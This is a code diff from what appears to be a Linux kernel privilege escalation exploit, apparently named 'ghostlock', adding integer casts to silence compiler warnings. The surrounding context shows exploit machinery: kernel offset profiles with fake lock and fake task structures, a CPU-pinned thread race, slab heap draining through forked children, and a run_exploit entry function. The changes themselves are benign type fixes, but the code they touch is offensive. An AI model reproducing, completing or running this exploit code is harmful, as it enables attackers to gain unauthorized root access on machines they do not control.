@@ -117,7 +117,7 @@ static int validate_offsets_profile(const struct kernel_offsets *entry) {
                 !entry->mm_struct_sz ||
                 entry->mcast_waiter_off <= 0 ||
                 !entry->mcast_buffer_size ||
-                entry->mcast_waiter_off + entry->mcast_lock_offset + sizeof(uint64_t) >
+                (uint32_t) entry->mcast_waiter_off + entry->mcast_lock_offset + sizeof(uint64_t) >
                         entry->mcast_buffer_size ||
                 !entry->mcast_task_offset || !entry->mcast_lock_offset ||
                 !entry->mcast_fake_lock_offset || !entry->mcast_fake_task_offset ||
@@ -392,7 +392,7 @@ void *owner_thread(void *arg) {
 void *consumer_thread(void *arg) {
     auto *race = static_cast<PiRaceContext *>(arg);
     disable_rseq_for_thread();
-    pin_to_core(race->consumer_cpu);
+    pin_to_core((size_t) race->consumer_cpu);
     pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
     int seen = 0;
     while (!atomic_load(&race->consumer_stop)) {
@@ -699,13 +699,13 @@ static void slab_drain(void) {
             }
             if (pid > 0) {
                 if (n >= (int) drain.size()) break;
-                drain[n++] = ghostlock::ChildProcess(pid);
+                drain[(size_t) n++] = ghostlock::ChildProcess(pid);
             } else {
                 break;
             }
         }
         /* kill + reap in the original order, now owned by ChildProcess */
-        for (int i = 0; i < n; i++) (void) drain[i].terminate_and_wait(SIGKILL);
+        for (int i = 0; i < n; i++) (void) drain[(size_t) i].terminate_and_wait(SIGKILL);
         sched_yield();
         usleep(20000);
     }
@@ -1366,7 +1366,7 @@ int run_exploit(int argc, char **argv) {
     apply_iomem_cache();
     log_startup_context();
     init_p0_profile();
-    pin_to_core(runtime_config_snapshot().main_cpu);
+    pin_to_core((size_t) runtime_config_snapshot().main_cpu);
     pr_info("main thread running on cpu=%d\n", sched_getcpu());
 
     timer_reset();
